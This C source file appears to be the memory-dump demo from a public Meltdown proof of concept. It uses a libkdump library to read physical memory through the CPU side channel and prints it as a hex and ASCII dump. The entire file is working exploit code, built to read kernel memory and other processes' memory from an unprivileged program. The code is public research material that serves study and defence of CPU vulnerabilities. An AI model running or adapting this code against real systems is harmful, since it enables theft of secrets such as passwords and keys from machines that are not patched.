#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>

static int running = 1;

void sigint(int signum __attribute__((unused))) {
  running = 0;
}

int main(int argc, char *argv[]) {
  size_t phys = 1ull * 1024ull * 1024ull * 1024ull; // start at first gigabyte
  size_t size = (size_t)-1ULL;

  // physical address at which the dump should begin
  if (argc >= 2) {
    phys = strtoull(argv[1], NULL, 0);
  }
  // Amount of bytes to read
  if (argc >= 3) {
    size = strtoull(argv[2], NULL, 0);
  }

  int width = 16; // characters per line
  int suppress_empty = 1;

  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  config.retries = 10;
  config.measurements = 2;
  if (argc >= 4) {
    config.physical_offset = strtoull(argv[3], NULL, 0);
  }

  libkdump_init(config);

  // Convert physical address at which the dump begins to virtual address
  size_t vaddr = libkdump_phys_to_virt(phys);

  if (vaddr == -1ULL) {
    fprintf(stderr, "Error converting physical to virtual address\n");
    return -1;
  }

  printf("Physical address       : %zx\n", phys);
  printf("Physical offset        : %zx\n", config.physical_offset);
  printf("Virtual address        : %zx\n", vaddr);

  if (width > size)
     width = size;

  size_t delta = 0;
  int i;
  char *buffer = malloc(width);

  signal(SIGINT, sigint);

  while (running && delta < size) {
    
    // Read one character from the setup address using Meltdown
    int value = libkdump_read(vaddr + delta);

    // Adds read value to a buffer of chars, which will be used to show the content
    buffer[delta % width] = value;

    if (delta % width == width - 1) {
      int skip = 1;
      for (i = 0; i < width; i++) {
        if (buffer[i]) {
          skip = 0;
          break;
        }
      }
      if (skip && suppress_empty) {
        delta++;
        continue;
      }

      // Physical address
      printf("%10zx: ", delta + phys - (width - 1));
      printf("| ");
      for (i = 0; i < width; i++) {
        // Hexadecimal Code of character
        printf("%02x ", (unsigned char)buffer[i]);
      }
      printf("| ");
      for (i = 0; i < width; i++) {
        // Convertion of hexadecimal to characters, if possible
        printf("%c", (buffer[i] >= 32 && buffer[i] <= 126) ? buffer[i] : '.');
      }
      printf(" |\n");
    }
    delta++;
  }

  free(buffer);
  libkdump_cleanup();

  return 0;
}